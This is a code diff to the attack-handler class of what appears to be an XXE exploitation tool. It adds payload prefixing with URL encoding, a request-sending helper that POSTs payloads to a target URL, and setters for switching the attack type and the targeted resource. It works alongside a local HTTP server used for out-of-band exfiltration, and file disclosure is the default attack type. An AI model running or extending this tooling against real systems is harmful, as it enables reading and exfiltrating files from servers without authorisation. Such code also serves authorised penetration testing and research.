@@ -4,9 +4,11 @@ from abc import ABC
 from abc import abstractmethod
 from typing import cast
 from typing import Optional
+from urllib.parse import quote_plus
 
 from xeely import RESOURCES_PATH
 from xeely.custom_http import HTTPClient
+from xeely.custom_http.response import HTTPResponse
 from xeely.custom_http.server import HTTPServerParams
 from xeely.custom_http.server import run_http_server
 from xeely.custom_xml import XML
@@ -22,11 +24,12 @@ class AbstractXXEAttackHandler(ABC):
         resource: str,
         xml: XML,
         target_url: str,
-        attack_mode: XXEAttackMode = XXEAttackMode.DIRECT,
+        attack_mode: XXEAttackMode,
         attack_type: XXEAttackType = XXEAttackType.FILE_DISCLOSURE,
         should_apply_base64_encoding: bool = False,
         should_use_cdata: bool = False,
         http_server_params: Optional[HTTPServerParams] = None,
+        payload_prefix: str = "",
     ):
         self._should_apply_base64_encoding = should_apply_base64_encoding
         self._target_url = target_url
@@ -36,6 +39,7 @@ class AbstractXXEAttackHandler(ABC):
         self._should_use_cdata = should_use_cdata
         self._http_server_params = http_server_params
         self._base_xml = xml
+        self._payload_prefix = payload_prefix
 
     def _pre_attack_verification(self) -> bool:
         return True
@@ -43,6 +47,20 @@ class AbstractXXEAttackHandler(ABC):
     @abstractmethod
     def _get_exfiltrated_data(self, **kwargs) -> str:
         raise NotImplementedError()
+
+    def change_attack_type(self, attack_type: XXEAttackType):
+        self._attack_type = attack_type
+
+    def change_resource(self, resource: str):
+        self._resource = resource
+
+    def _send_request(self, data: str) -> HTTPResponse:
+        if self._payload_prefix != "":
+            data = quote_plus(data)
+
+        return HTTPClient.send_post_request(
+            url=self._target_url, data=f"{self._payload_prefix}{data}"
+        )
 
     def run_attack(self) -> str:
         if not self._pre_attack_verification():
@@ -69,9 +87,8 @@ class AbstractXXEAttackHandler(ABC):
             lport = cast(HTTPServerParams, self._http_server_params).get_port()
 
             with run_http_server(lhost=lhost, lport=lport):
-                http_response = HTTPClient.send_post_request(
-                    url=self._target_url, data=payload_generator.generate_payload()
-                )
+                payload = payload_generator.generate_payload()
+                http_response = self._send_request(payload)
 
             os.remove(dtd_file_path)
         else:
